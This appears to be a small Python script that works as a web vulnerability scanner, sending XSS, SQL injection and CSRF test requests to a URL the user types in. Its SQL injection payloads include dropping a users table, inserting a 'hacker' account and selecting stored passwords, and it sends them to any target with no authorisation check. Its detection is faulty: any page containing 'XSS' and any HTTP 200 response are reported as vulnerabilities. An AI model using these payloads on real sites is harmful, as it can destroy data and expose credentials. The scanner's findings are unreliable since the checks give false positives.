import requests

def check_xss(url):
    # Set a list of payloads to test
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg/onload=alert(\"XSS\")>",
    ]
    
    # Iterate through the payloads and test each one
    for payload in payloads:
        # Inject the payload into the query string
        r = requests.get(url + "?q=" + payload)
        
        # Check the response to see if the payload was successful
        if "XSS" in r.text:
            print(f"XSS vulnerability detected with payload: {payload}")
            print(f"URL: {url}?q={payload}")
    print("XSS testing complete.")

def check_sql_injection(url):
    # Set a list of payloads to test
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users WHERE '1'='1",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    ]
    
    # Iterate through the payloads and test each one
    for payload in payloads:
        # Inject the payload into the query string
        r = requests.get(url + "?q=" + payload)
        
        # Check the response to see if the payload was successful
        if "SQL syntax" in r.text:
            print(f"SQL injection vulnerability detected with payload: {payload}")
            print(f"URL: {url}?q={payload}")
    print("SQL injection testing complete.")

def check_csrf(url):
    # Set a list of payloads to test
    payloads = [
        {"name": "John", "age": "30"},
        {"name": "Jane", "age": "20", "csrf_token": "invalid_token"},
        {"name": "John", "age": "30", "csrf_token": "invalid_token"},
        {"name": "Jane", "age": "20"},
    ]
    
    # Iterate through the payloads and test each one
    for payload in payloads:
        # Send a POST request to the URL with the payload
        r = requests.post(url, data=payload)
        
        # Check the response to see if the payload was successful
        if r.status_code == 200:
             print(f"CSRF vulnerability detected with payload: {payload}")
             print(f"URL: {url}")
    print("CSRF testing complete.")

# Prompt the user to select a type of vulnerability to test for
vulnerability = input("Enter the type of vulnerability to test for (1. XSS, 2. SQL injection, 3. CSRF): ")

# Prompt the user to enter the URL to be tested
url = input("Enter the URL to test for vulnerabilities: ")

# Test the selected vulnerability on the specified URL
if vulnerability == "1":
    check_xss(url)
elif vulnerability == "2":
    check_sql_injection(url)
elif vulnerability == "3":
    check_csrf(url)
else:
    print("Invalid vulnerability type.")

